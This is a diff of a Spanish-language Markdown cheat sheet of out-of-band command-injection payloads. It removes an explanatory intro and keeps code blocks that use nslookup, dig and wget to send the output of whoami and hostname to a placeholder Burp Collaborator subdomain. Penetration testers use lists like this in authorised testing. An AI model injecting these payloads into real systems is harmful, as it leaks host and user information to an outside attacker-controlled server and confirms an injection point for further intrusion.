@@ -4,13 +4,7 @@
 
 ---
 ---
-#### 🕵️ **¿Qué es la Exfiltración DNS?**  
-El objetivo de estos payloads es realizar consultas DNS que envían información al atacante a través de subdominios controlados.  
-Se suelen utilizar herramientas como **Burp Collaborator** o servicios similares para capturar las solicitudes DNS generadas desde el servidor comprometido.
-
----
-
-## 🧩 **Payloads usando `nslookup`**
+## **Payloads usando `nslookup`**
 Estos payloads intentan realizar una consulta DNS hacia un subdominio controlado.  
 ```python
 ||nslookup+`whoami`.BURP-COLLABORATOR-SUBDOMAIN||``
@@ -24,8 +18,7 @@ nslookup $(hostname).BURP-COLLABORATOR-SUBDOMAIN
 ```
 
 ---
-
-## 🔎 **Payloads usando `dig`**
+## **Payloads usando `dig`**
 Estos payloads hacen uso de `dig` para realizar consultas DNS hacia el subdominio controlado.  
 ```python
 dig $(whoami).BURP-COLLABORATOR-SUBDOMAIN
@@ -35,8 +28,7 @@ dig @8.8.8.8 x.BURP-COLLABORATOR-SUBDOMAIN
 ```
 
 ---
-
-## 🛰️ **Payloads usando `wget`**
+## **Payloads usando `wget`**
 Utiliza `wget` para enviar información a través de una solicitud HTTP.  
 ```python
 wget http://BURP-COLLABORATOR-SUBDOMAIN/$(whoami)
